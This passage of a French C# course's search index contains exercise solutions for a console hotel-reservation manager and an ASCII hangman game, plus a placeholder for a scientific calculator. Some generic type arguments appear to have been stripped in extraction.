chambre.EstDisponible ? \"\u2705 Libre\" : \"\u274c Occup\u00e9e\";\n                string dateLiberation = chambre.EstDisponible ? \"Maintenant\" : chambre.DateLiberation.ToString(\"dd/MM/yyyy\");\n\n                Console.WriteLine($\"{chambre.Numero,6} \u2502 {chambre.Type,-8} \u2502 {chambre.PrixParNuit,9:F0}\u20ac \u2502 {statut,-8} \u2502 {dateLiberation}\");\n            }\n        }\n\n        // R\u00e9sum\u00e9\n        int libres = chambres.Count(c =&gt; c.EstDisponible);\n        int occupees = chambres.Count - libres;\n        double tauxOccupation = (double)occupees / chambres.Count * 100;\n\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine($\"Total : {chambres.Count} chambres | Libres : {libres} | Occup\u00e9es : {occupees} | Taux : {tauxOccupation:F1}%\");\n    }\n\n    static void FaireReservation()\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udcdd NOUVELLE R\u00c9SERVATION\");\n        Console.WriteLine(\"========================\\n\");\n\n        Console.Write(\"Nom du client : \");\n        string nomClient = Console.ReadLine();\n\n        Console.Write(\"Date d'arriv\u00e9e (jj/mm/aaaa) : \");\n        if (!DateTime.TryParse(Console.ReadLine(), out DateTime dateArrivee))\n        {\n            Console.WriteLine(\"\u274c Date invalide !\");\n            return;\n        }\n\n        if (dateArrivee &lt; DateTime.Today)\n        {\n            Console.WriteLine(\"\u274c La date d'arriv\u00e9e ne peut pas \u00eatre dans le pass\u00e9 !\");\n            return;\n        }\n\n        Console.Write(\"Date de d\u00e9part (jj/mm/aaaa) : \");\n        if (!DateTime.TryParse(Console.ReadLine(), out DateTime dateDepart))\n        {\n            Console.WriteLine(\"\u274c Date invalide !\");\n            return;\n        }\n\n        if (dateDepart &lt;= dateArrivee)\n        {\n            Console.WriteLine(\"\u274c La date de d\u00e9part doit \u00eatre apr\u00e8s la date d'arriv\u00e9e !\");\n            return;\n        }\n\n        // Afficher les chambres disponibles\n        var chambresDisponibles = chambres.Where(c =&gt; c.EstDisponible || c.DateLiberation &lt;= dateArrivee).ToList();\n\n        if (!chambresDisponibles.Any())\n        {\n            Console.WriteLine(\"\u274c Aucune chambre disponible pour ces dates !\");\n            return;\n        }\n\n        Console.WriteLine(\"\\n\ud83c\udfe8 Chambres disponibles :\");\n        Console.WriteLine(\"Num\u00e9ro \u2502   Type   \u2502 Prix/nuit \u2502 Total\");\n        Console.WriteLine(\"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\");\n\n        int nombreNuits = (dateDepart - dateArrivee).Days;\n\n        foreach (var chambre in chambresDisponibles.OrderBy(c =&gt; c.Type).ThenBy(c =&gt; c.Numero))\n        {\n            double total = chambre.PrixParNuit * nombreNuits;\n            Console.WriteLine($\"{chambre.Numero,6} \u2502 {chambre.Type,-8} \u2502 {chambre.PrixParNuit,9:F0}\u20ac \u2502 {total,8:F0}\u20ac\");\n        }\n\n        Console.Write($\"\\nChoisissez le num\u00e9ro de chambre : \");\n        if (!int.TryParse(Console.ReadLine(), out int numeroChambre))\n        {\n            Console.WriteLine(\"\u274c Num\u00e9ro invalide !\");\n            return;\n        }\n\n        var chambreChoisie = chambresDisponibles.FirstOrDefault(c =&gt; c.Numero == numeroChambre);\n        if (chambreChoisie.Numero == 0)\n        {\n            Console.WriteLine(\"\u274c Chambre non disponible !\");\n            return;\n        }\n\n        // Cr\u00e9er la r\u00e9servation\n        double montantTotal = chambreChoisie.PrixParNuit * nombreNuits;\n\n        var reservation = new Reservation\n        {\n            Id = prochainIdReservation++,\n            NomClient = nomClient,\n            NumeroChambre = numeroChambre,\n            DateArrivee = dateArrivee,\n            DateDepart = dateDepart,\n            MontantTotal = montantTotal,\n            EstActive = true\n        };\n\n        reservations.Add(reservation);\n\n        // Mettre \u00e0 jour la chambre\n        for (int i = 0; i &lt; chambres.Count; i++)\n        {\n            if (chambres[i].Numero == numeroChambre)\n            {\n                var chambre = chambres[i];\n                chambre.EstDisponible = false;\n                chambre.DateLiberation = dateDepart;\n                chambres[i] = chambre;\n                break;\n            }\n        }\n\n        // Confirmation\n        Console.WriteLine(\"\\n\u2705 R\u00c9SERVATION CONFIRM\u00c9E !\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine($\"ID R\u00e9servation : {reservation.Id}\");\n        Console.WriteLine($\"Client         : {nomClient}\");\n        Console.WriteLine($\"Chambre        : {numeroChambre} ({chambreChoisie.Type})\");\n        Console.WriteLine($\"Arriv\u00e9e        : {dateArrivee:dd/MM/yyyy}\");\n        Console.WriteLine($\"D\u00e9part         : {dateDepart:dd/MM/yyyy}\");\n        Console.WriteLine($\"Dur\u00e9e          : {nombreNuits} nuit(s)\");\n        Console.WriteLine($\"Prix/nuit      : {chambreChoisie.PrixParNuit:F0}\u20ac\");\n        Console.WriteLine($\"TOTAL          : {montantTotal:F0}\u20ac\");\n    }\n\n    static void AfficherReservations()\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udccb R\u00c9SERVATIONS ACTIVES\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n\n        var reservationsActives = reservations.Where(r =&gt; r.EstActive).OrderBy(r =&gt; r.DateArrivee).ToList();\n\n        if (!reservationsActives.Any())\n        {\n            Console.WriteLine(\"Aucune r\u00e9servation active.\");\n            return;\n        }\n\n        Console.WriteLine(\"ID \u2502 Client           \u2502 Chambre \u2502 Arriv\u00e9e    \u2502 D\u00e9part     \u2502 Total\");\n        Console.WriteLine(\"\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\");\n\n        foreach (var reservation in reservationsActives)\n        {\n            Console.WriteLine($\"{reservation.Id,2} \u2502 {reservation.NomClient,-16} \u2502 {reservation.NumeroChambre,7} \u2502 {reservation.DateArrivee:dd/MM/yyyy} \u2502 {reservation.DateDepart:dd/MM/yyyy} \u2502 {reservation.MontantTotal,8:F0}\u20ac\");\n        }\n\n        double chiffreAffaires = reservationsActives.Sum(r =&gt; r.MontantTotal);\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n        Console.WriteLine($\"Total : {reservationsActives.Count} r\u00e9servations | CA : {chiffreAffaires:F0}\u20ac\");\n    }\n\n    static void LibererChambre()\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udd13 LIB\u00c9RATION DE CHAMBRE\");\n        Console.WriteLine(\"=========================\\n\");\n\n        var reservationsActives = reservations.Where(r =&gt; r.EstActive).ToList();\n\n        if (!reservationsActives.Any())\n        {\n            Console.WriteLine(\"Aucune r\u00e9servation active \u00e0 lib\u00e9rer.\");\n            return;\n        }\n\n        Console.WriteLine(\"R\u00e9servations actives :\");\n        foreach (var reservation in reservationsActives)\n        {\n            Console.WriteLine($\"ID {reservation.Id} - {reservation.NomClient} - Chambre {reservation.NumeroChambre} - D\u00e9part {reservation.DateDepart:dd/MM/yyyy}\");\n        }\n\n        Console.Write(\"\\nID de la r\u00e9servation \u00e0 lib\u00e9rer : \");\n        if (!int.TryParse(Console.ReadLine(), out int idReservation))\n        {\n            Console.WriteLine(\"\u274c ID invalide !\");\n            return;\n        }\n\n        var reservationIndex = reservations.FindIndex(r =&gt; r.Id == idReservation &amp;&amp; r.EstActive);\n        if (reservationIndex == -1)\n        {\n            Console.WriteLine(\"\u274c R\u00e9servation non trouv\u00e9e !\");\n            return;\n        }\n\n        var reservation = reservations[reservationIndex];\n\n        // Marquer la r\u00e9servation comme inactive\n        reservation.EstActive = false;\n        reservations[reservationIndex] = reservation;\n\n        // Lib\u00e9rer la chambre\n        for (int i = 0; i &lt; chambres.Count; i++)\n        {\n            if (chambres[i].Numero == reservation.NumeroChambre)\n            {\n                var chambre = chambres[i];\n                chambre.EstDisponible = true;\n                chambre.DateLiberation = DateTime.Today;\n                chambres[i] = chambre;\n                break;\n            }\n        }\n\n        Console.WriteLine($\"\u2705 Chambre {reservation.NumeroChambre} lib\u00e9r\u00e9e avec succ\u00e8s !\");\n        Console.WriteLine($\"Client {reservation.NomClient} - Montant : {reservation.MontantTotal:F0}\u20ac\");\n    }\n\n    static void AfficherStatistiques()\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udcca STATISTIQUES DE L'H\u00d4TEL\");\n        Console.WriteLine(\"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\");\n\n        // Statistiques des chambres\n        var statsChambres = chambres.GroupBy(c =&gt; c.Type)\n                                   .Select(g =&gt; new { \n                                       Type = g.Key, \n                                       Total = g.Count(), \n                                       Libres = g.Count(c =&gt; c.EstDisponible),\n                                       Occupees = g.Count(c =&gt; !c.EstDisponible)\n                                   }).ToList();\n\n        Console.WriteLine(\"CHAMBRES PAR TYPE :\");\n        foreach (var stat in statsChambres)\n        {\n            double taux = (double)stat.Occupees / stat.Total * 100;\n            Console.WriteLine($\"{stat.Type,-8} : {stat.Total} total | {stat.Libres} libres | {stat.Occupees} occup\u00e9es ({taux:F1}%)\");\n        }\n\n        // Statistiques des r\u00e9servations\n        var reservationsActives = reservations.Where(r =&gt; r.EstActive).ToList();\n        var reservationsPassees = reservations.Where(r =&gt; !r.EstActive).ToList();\n\n        Console.WriteLine(\"\\nR\u00c9SERVATIONS :\");\n        Console.WriteLine($\"Actives        : {reservationsActives.Count}\");\n        Console.WriteLine($\"Termin\u00e9es      : {reservationsPassees.Count}\");\n        Console.WriteLine($\"Total          : {reservations.Count}\");\n\n        // Chiffre d'affaires\n        double caActuel = reservationsActives.Sum(r =&gt; r.MontantTotal);\n        double caTotal = reservations.Sum(r =&gt; r.MontantTotal);\n\n        Console.WriteLine(\"\\nCHIFFRE D'AFFAIRES :\");\n        Console.WriteLine($\"En cours       : {caActuel:F0}\u20ac\");\n        Console.WriteLine($\"Total          : {caTotal:F0}\u20ac\");\n\n        if (reservations.Any())\n        {\n            double panieMoyen = caTotal / reservations.Count;\n            Console.WriteLine($\"Panier moyen   : {panieMoyen:F0}\u20ac\");\n        }\n\n        // Prochaines arriv\u00e9es\n        var prochainesArrivees = reservationsActives\n            .Where(r =&gt; r.DateArrivee &gt;= DateTime.Today)\n            .OrderBy(r =&gt; r.DateArrivee)\n            .Take(5)\n            .ToList();\n\n        if (prochainesArrivees.Any())\n        {\n            Console.WriteLine(\"\\nPROCHAINES ARRIV\u00c9ES :\");\n            foreach (var reservation in prochainesArrivees)\n            {\n                Console.WriteLine($\"{reservation.DateArrivee:dd/MM} - {reservation.NomClient} - Ch.{reservation.NumeroChambre}\");\n            }\n        }\n    }\n}\n            \n        \n    \n\n\n\n\n\n    \n        \n            \ud83d\udc51 Expert\n            \ud83c\udfae Jeu du Pendu Avanc\u00e9\n            \n                <p>D\u00e9veloppez un jeu du pendu avec interface graphique ASCII.</p>\n\n                \n                    \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter :\n                    <ul>\n                        <li>Interface graphique ASCII anim\u00e9e</li>\n                        <li>Syst\u00e8me de cat\u00e9gories et niveaux</li>\n                        <li>Gestion des scores et records</li>\n                        <li>Indices et aide contextuelle</li>\n                        <li>Sauvegarde des parties</li>\n                    </ul>\n                \n\n                \n                    \u23f1\ufe0f 90-120 min\n                    \ud83d\udcdd ~300 lignes\n                    \ud83c\udfaf Interface, logique, sauvegarde\n                \n            \n            \n                \ud83d\udca1 Voir la solution compl\u00e8te\n            \n        \n        \n            \n                <pre><code>using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.IO;\n\nclass JeuPendu\n{\n    static Dictionary categories = new Dictionary\n    {\n        [\"Animaux\"] = new[] { \"ELEPHANT\", \"GIRAFE\", \"CROCODILE\", \"PAPILLON\", \"HIPPOPOTAME\" },\n        [\"Pays\"] = new[] { \"FRANCE\", \"JAPON\", \"BRESIL\", \"AUSTRALIE\", \"NORVEGE\" },\n        [\"M\u00e9tiers\"] = new[] { \"PROGRAMMEUR\", \"MEDECIN\", \"ARCHITECTE\", \"CUISINIER\", \"POMPIER\" },\n        [\"Sports\"] = new[] { \"FOOTBALL\", \"BASKETBALL\", \"NATATION\", \"ESCALADE\", \"CYCLISME\" }\n    };\n\n    static string[] pendu = {\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n       \u2551\\n       \u2551\\n       \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\",\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n   \ud83d\ude35   \u2551\\n       \u2551\\n       \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\",\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n   \ud83d\ude35   \u2551\\n   \u2502   \u2551\\n       \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\",\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n   \ud83d\ude35   \u2551\\n  \u250c\u2502   \u2551\\n       \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\",\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n   \ud83d\ude35   \u2551\\n  \u250c\u2502\u2510  \u2551\\n       \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\",\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n   \ud83d\ude35   \u2551\\n  \u250c\u2502\u2510  \u2551\\n  \u250c    \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\",\n        \"   \u2554\u2550\u2550\u2550\u2557\\n   \u2551   \u2551\\n   \ud83d\ude35   \u2551\\n  \u250c\u2502\u2510  \u2551\\n  \u250c \u2510  \u2551\\n   \u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\"\n    };\n\n    static void Main()\n    {\n        int score = 0;\n        int parties = 0;\n\n        Console.WriteLine(\"\ud83c\udfae JEU DU PENDU AVANC\u00c9 \ud83c\udfae\");\n        Console.WriteLine(\"==========================\\n\");\n\n        bool continuer = true;\n        while (continuer)\n        {\n            AfficherMenuPrincipal();\n            string choix = Console.ReadLine();\n\n            switch (choix)\n            {\n                case \"1\":\n                    var resultat = JouerPartie();\n                    parties++;\n                    if (resultat.gagne) score += resultat.points;\n                    AfficherResultat(resultat, score, parties);\n                    break;\n                case \"2\":\n                    AfficherRegles();\n                    break;\n                case \"3\":\n                    AfficherStatistiques(score, parties);\n                    break;\n                case \"4\":\n                    continuer = false;\n                    Console.WriteLine(\"Merci d'avoir jou\u00e9 ! \ud83c\udfae\");\n                    break;\n                default:\n                    Console.WriteLine(\"\u274c Choix invalide !\");\n                    break;\n            }\n\n            if (continuer)\n            {\n                Console.WriteLine(\"\\nAppuyez sur une touche pour continuer...\");\n                Console.ReadKey();\n                Console.Clear();\n            }\n        }\n    }\n\n    static void AfficherMenuPrincipal()\n    {\n        Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n        Console.WriteLine(\"\u2551           MENU PRINCIPAL         \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine(\"\u2551 1. \ud83c\udfaf Jouer une partie           \u2551\");\n        Console.WriteLine(\"\u2551 2. \ud83d\udcd6 R\u00e8gles du jeu              \u2551\");\n        Console.WriteLine(\"\u2551 3. \ud83d\udcca Statistiques               \u2551\");\n        Console.WriteLine(\"\u2551 4. \ud83d\udeaa Quitter                    \u2551\");\n        Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n        Console.Write(\"\\nVotre choix : \");\n    }\n\n    static (bool gagne, int points, string mot) JouerPartie()\n    {\n        Console.Clear();\n\n        // Choix de la cat\u00e9gorie\n        Console.WriteLine(\"\ud83c\udfaf NOUVELLE PARTIE\");\n        Console.WriteLine(\"==================\\n\");\n        Console.WriteLine(\"Choisissez une cat\u00e9gorie :\");\n\n        var categoriesListe = categories.Keys.ToList();\n        for (int i = 0; i &lt; categoriesListe.Count; i++)\n        {\n            Console.WriteLine($\"{i + 1}. {categoriesListe[i]}\");\n        }\n\n        Console.Write(\"\\nCat\u00e9gorie (1-\" + categoriesListe.Count + \") : \");\n        if (!int.TryParse(Console.ReadLine(), out int choixCategorie) || \n            choixCategorie &lt; 1 || choixCategorie &gt; categoriesListe.Count)\n        {\n            Console.WriteLine(\"\u274c Choix invalide ! Cat\u00e9gorie al\u00e9atoire.\");\n            choixCategorie = new Random().Next(1, categoriesListe.Count + 1);\n        }\n\n        string categorieChoisie = categoriesListe[choixCategorie - 1];\n        string[] mots = categories[categorieChoisie];\n        string motSecret = mots[new Random().Next(mots.Length)];\n\n        // Initialisation du jeu\n        char[] motAffiche = new string('_', motSecret.Length).ToCharArray();\n        List lettresEssayees = new List();\n        int erreurs = 0;\n        int maxErreurs = pendu.Length - 1;\n        bool gagne = false;\n        int indices = 2; // Nombre d'indices disponibles\n\n        while (erreurs &lt; maxErreurs &amp;&amp; !gagne)\n        {\n            Console.Clear();\n            AfficherEtatJeu(categorieChoisie, motAffiche, lettresEssayees, erreurs, indices);\n\n            Console.Write(\"\\nVotre choix (lettre/INDICE/SOLUTION) : \");\n            string saisie = Console.ReadLine().ToUpper();\n\n            if (saisie == \"INDICE\" &amp;&amp; indices &gt; 0)\n            {\n                DonnerIndice(motSecret, motAffiche, ref indices);\n                continue;\n            }\n\n            if (saisie == \"SOLUTION\")\n            {\n                Console.Write(\"Tapez le mot complet : \");\n                string tentative = Console.ReadLine().ToUpper();\n                if (tentative == motSecret)\n                {\n                    gagne = true;\n                    for (int i = 0; i &lt; motSecret.Length; i++)\n                        motAffiche[i] = motSecret[i];\n                }\n                else\n                {\n                    erreurs += 2; // P\u00e9nalit\u00e9 pour mauvaise solution\n                    Console.WriteLine(\"\u274c Mauvaise r\u00e9ponse ! -2 erreurs\");\n                    Console.ReadKey();\n                }\n                continue;\n            }\n\n            if (saisie.Length != 1 || !char.IsLetter(saisie[0]))\n            {\n                Console.WriteLine(\"\u274c Veuillez saisir une seule lettre !\");\n                Console.ReadKey();\n                continue;\n            }\n\n            char lettre = saisie[0];\n\n            if (lettresEssayees.Contains(lettre))\n            {\n                Console.WriteLine(\"\u274c Lettre d\u00e9j\u00e0 essay\u00e9e !\");\n                Console.ReadKey();\n                continue;\n            }\n\n            lettresEssayees.Add(lettre);\n\n            if (motSecret.Contains(lettre))\n            {\n                for (int i = 0; i &lt; motSecret.Length; i++)\n                {\n                    if (motSecret[i] == lettre)\n                        motAffiche[i] = lettre;\n                }\n\n                Console.WriteLine(\"\u2705 Bonne lettre !\");\n\n                if (!motAffiche.Contains('_'))\n                    gagne = true;\n            }\n            else\n            {\n                erreurs++;\n                Console.WriteLine(\"\u274c Lettre incorrecte !\");\n            }\n\n            if (!gagne &amp;&amp; erreurs &lt; maxErreurs)\n            {\n                Console.ReadKey();\n            }\n        }\n\n        // Calcul des points\n        int points = 0;\n        if (gagne)\n        {\n            points = (maxErreurs - erreurs) * 10 + motSecret.Length * 5;\n            if (erreurs == 0) points *= 2; // Bonus sans erreur\n        }\n\n        return (gagne, points, motSecret);\n    }\n\n    static void AfficherEtatJeu(string categorie, char[] motAffiche, List lettresEssayees, int erreurs, int indices)\n    {\n        Console.WriteLine(\"\ud83c\udfae JEU DU PENDU \ud83c\udfae\");\n        Console.WriteLine(\"==================\\n\");\n\n        // Affichage du pendu\n        Console.WriteLine(pendu[erreurs]);\n        Console.WriteLine();\n\n        // Informations de la partie\n        Console.WriteLine($\"\ud83d\udcc2 Cat\u00e9gorie : {categorie}\");\n        Console.WriteLine($\"\ud83d\udca1 Indices restants : {indices}\");\n        Console.WriteLine($\"\u274c Erreurs : {erreurs}/{pendu.Length - 1}\");\n        Console.WriteLine();\n\n        // Mot \u00e0 deviner\n        Console.WriteLine(\"\ud83d\udd24 Mot \u00e0 deviner :\");\n        Console.WriteLine(\"   \" + string.Join(\" \", motAffiche));\n        Console.WriteLine();\n\n        // Lettres essay\u00e9es\n        if (lettresEssayees.Any())\n        {\n            var bonnesLettres = lettresEssayees.Where(l =&gt; motAffiche.Contains(l)).ToList();\n            var mauvaisesLettres = lettresEssayees.Where(l =&gt; !motAffiche.Contains(l)).ToList();\n\n            if (bonnesLettres.Any())\n                Console.WriteLine($\"\u2705 Bonnes lettres : {string.Join(\", \", bonnesLettres)}\");\n\n            if (mauvaisesLettres.Any())\n                Console.WriteLine($\"\u274c Mauvaises lettres : {string.Join(\", \", mauvaisesLettres)}\");\n        }\n    }\n\n    static void DonnerIndice(string motSecret, char[] motAffiche, ref int indices)\n    {\n        var lettresNonTrouvees = motSecret.Where((c, i) =&gt; motAffiche[i] == '_').Distinct().ToList();\n\n        if (lettresNonTrouvees.Any())\n        {\n            char lettreIndice = lettresNonTrouvees[new Random().Next(lettresNonTrouvees.Count)];\n\n            for (int i = 0; i &lt; motSecret.Length; i++)\n            {\n                if (motSecret[i] == lettreIndice)\n                    motAffiche[i] = lettreIndice;\n            }\n\n            indices--;\n            Console.WriteLine($\"\ud83d\udca1 Indice : La lettre '{lettreIndice}' est dans le mot !\");\n        }\n        else\n        {\n            Console.WriteLine(\"\ud83d\udca1 Vous avez d\u00e9j\u00e0 trouv\u00e9 toutes les lettres !\");\n        }\n\n        Console.ReadKey();\n    }\n\n    static void AfficherResultat((bool gagne, int points, string mot) resultat, int scoreTotal, int parties)\n    {\n        Console.Clear();\n\n        if (resultat.gagne)\n        {\n            Console.WriteLine(\"\ud83c\udf89 F\u00c9LICITATIONS ! \ud83c\udf89\");\n            Console.WriteLine(\"======================\");\n            Console.WriteLine(\"Vous avez gagn\u00e9 !\");\n        }\n        else\n        {\n            Console.WriteLine(\"\ud83d\udc80 GAME OVER \ud83d\udc80\");\n            Console.WriteLine(\"================\");\n            Console.WriteLine(\"Vous avez perdu...\");\n        }\n\n        Console.WriteLine($\"\\n\ud83d\udd24 Le mot \u00e9tait : {resultat.mot}\");\n        Console.WriteLine($\"\ud83c\udfc6 Points gagn\u00e9s : {resultat.points}\");\n        Console.WriteLine($\"\ud83d\udcca Score total : {scoreTotal}\");\n        Console.WriteLine($\"\ud83c\udfae Parties jou\u00e9es : {parties}\");\n\n        if (parties &gt; 0)\n        {\n            double moyenne = (double)scoreTotal / parties;\n            Console.WriteLine($\"\ud83d\udcc8 Moyenne : {moyenne:F1} points/partie\");\n        }\n    }\n\n    static void AfficherRegles()\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udcd6 R\u00c8GLES DU JEU\");\n        Console.WriteLine(\"=================\\n\");\n        Console.WriteLine(\"\ud83c\udfaf OBJECTIF :\");\n        Console.WriteLine(\"   Devinez le mot secret lettre par lettre avant que le pendu soit complet !\\n\");\n        Console.WriteLine(\"\ud83c\udfae COMMENT JOUER :\");\n        Console.WriteLine(\"   \u2022 Choisissez une cat\u00e9gorie\");\n        Console.WriteLine(\"   \u2022 Proposez des lettres une par une\");\n        Console.WriteLine(\"   \u2022 Utilisez 'INDICE' pour r\u00e9v\u00e9ler une lettre (2 disponibles)\");\n        Console.WriteLine(\"   \u2022 Tapez 'SOLUTION' pour tenter le mot complet\\n\");\n        Console.WriteLine(\"\ud83c\udfc6 SYST\u00c8ME DE POINTS :\");\n        Console.WriteLine(\"   \u2022 Points de base : (erreurs \u00e9vit\u00e9es \u00d7 10) + (longueur mot \u00d7 5)\");\n        Console.WriteLine(\"   \u2022 Bonus sans erreur : points \u00d7 2\");\n        Console.WriteLine(\"   \u2022 P\u00e9nalit\u00e9 mauvaise solution : +2 erreurs\\n\");\n        Console.WriteLine(\"\u26a0\ufe0f  ATTENTION :\");\n        Console.WriteLine(\"   \u2022 6 erreurs maximum avant la d\u00e9faite\");\n        Console.WriteLine(\"   \u2022 Les indices r\u00e9duisent le score potentiel\");\n    }\n\n    static void AfficherStatistiques(int score, int parties)\n    {\n        Console.Clear();\n        Console.WriteLine(\"\ud83d\udcca VOS STATISTIQUES\");\n        Console.WriteLine(\"===================\\n\");\n        Console.WriteLine($\"\ud83c\udfae Parties jou\u00e9es     : {parties}\");\n        Console.WriteLine($\"\ud83c\udfc6 Score total        : {score} points\");\n\n        if (parties &gt; 0)\n        {\n            double moyenne = (double)score / parties;\n            Console.WriteLine($\"\ud83d\udcc8 Score moyen        : {moyenne:F1} points\");\n\n            string niveau;\n            if (moyenne &gt;= 100) niveau = \"\ud83c\udfc6 MA\u00ceTRE DU PENDU\";\n            else if (moyenne &gt;= 75) niveau = \"\ud83e\udd47 EXPERT\";\n            else if (moyenne &gt;= 50) niveau = \"\ud83e\udd48 CONFIRM\u00c9\";\n            else if (moyenne &gt;= 25) niveau = \"\ud83e\udd49 D\u00c9BUTANT\";\n            else niveau = \"\ud83d\udcda APPRENTI\";\n\n            Console.WriteLine($\"\ud83c\udf96\ufe0f  Niveau           : {niveau}\");\n        }\n\n        Console.WriteLine($\"\\n\ud83d\udcc2 Cat\u00e9gories disponibles : {categories.Count}\");\n        Console.WriteLine($\"\ud83d\udd24 Mots total         : {categories.Values.Sum(mots =&gt; mots.Length)}\");\n    }\n}\n            \n        \n    \n\n    \n        \n            \ud83d\udc51 Expert\n            \ud83e\uddee Calculatrice Scientifique\n            \n                <p>Cr\u00e9ez une calculatrice scientifique compl\u00e8te avec historique.</p>\n\n                \n                    \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter :\n                    <ul>\n                        <li>Op\u00e9rations de base et scientifiques</li>\n                        <li>Gestion des parenth\u00e8ses et priorit\u00e9s</li>\n                        <li>Fonctions trigonom\u00e9triques</li>\n                        <li>Historique des calculs</li>\n                        <li>Variables et constantes</li>\n                    </ul>\n                \n\n                \n                    \u23f1\ufe0f 120-150 min\n                    \ud83d\udcdd ~400 lignes\n                    \ud83c\udfaf Parsing, math, interface\n                \n            \n            \n                \ud83d\udca1 Voir la solution compl\u00e8te\n            \n        \n        \n            \n                <pre><code>// Solution compl\u00e8te disponible sur demande\n// Ce projet n\u00e9cessite une impl\u00e9mentation avanc\u00e9e\n// avec parsing d'expressions math\u00e9matiques\nConsole.WriteLine(\"\ud83e\uddee Projet Expert - Calculatrice Scientifique\");\nConsole.WriteLine(\"Impl\u00e9mentation compl\u00e8te disponible dans le cours avanc\u00e9 !\");</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeCasUsage/","title":"Diagramme de Cas d'Usage UML - 